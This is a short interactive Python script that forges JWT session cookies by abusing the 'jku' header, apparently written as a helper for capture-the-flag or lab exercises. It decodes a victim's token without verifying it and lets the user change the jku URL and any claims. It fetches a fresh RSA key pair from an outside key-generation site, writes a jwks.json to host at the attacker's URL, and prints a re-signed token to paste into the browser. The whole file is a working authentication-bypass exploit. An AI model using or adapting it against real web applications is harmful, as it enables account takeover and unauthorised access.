#!/usr/bin/env python3

from requests import get
import json
import jwt
from cryptography.hazmat.primitives import serialization
import sys


cookie_data = str(input('Enter the base64 data from cookie: '))
header = jwt.get_unverified_header(cookie_data)
payload = jwt.decode(cookie_data, options={'verify_signature': False})
if 'jku' in header:
    print('jku present in header')
else:
    print('jku not present in header')
    print('Header =', header)
    print('Paylod =', payload)
    sys.exit(0)
print('Current jku =', header['jku'])
new_jku = str(input('Enter new jku: '))
header['jku'] = new_jku
print('Current payload =', payload)
new_payload = dict()
for key in payload.keys():
    print('For key', key)
    new_key = input('Change key name here or press enter to keep it named ' + key + ': ')
    new_value = input('Change value here or press enter to keep it ' + payload[key] + ': ')
    if new_key == '':
        new_key = key
    if new_value == '':
        new_value = payload[key]
    new_payload[new_key] = new_value
response = get("http://mkjwk.org/jwk/rsa?alg=RS256&use=sig&gen=sha256&x509=true&size=2048")
data = json.loads(response.text)
jwks_pub = data['jwks']
priv_key_pem = data['x509priv']
del_list = ['p', 'q', 'd', 'qi', 'dp', 'dq']
for entry in del_list:
    del jwks_pub['keys'][0][entry]
jwks_file = open('jwks.json', 'w')
json.dump(jwks_pub, jwks_file, indent=4)
jwks_file.close()
key = serialization.load_pem_private_key(priv_key_pem.encode(), None)
token = jwt.encode(
  payload=new_payload,
  key=key,
  algorithm='RS256',
  headers=header,
)
print('Change your cookie, I recommend "Cookie Quick Manager" Firefox plugin:\n')
print(token)
print('\n')
print('We made a file named "jwks.json", serve it where your new jku points to')
print('\n')
print('Good Night Irene!')
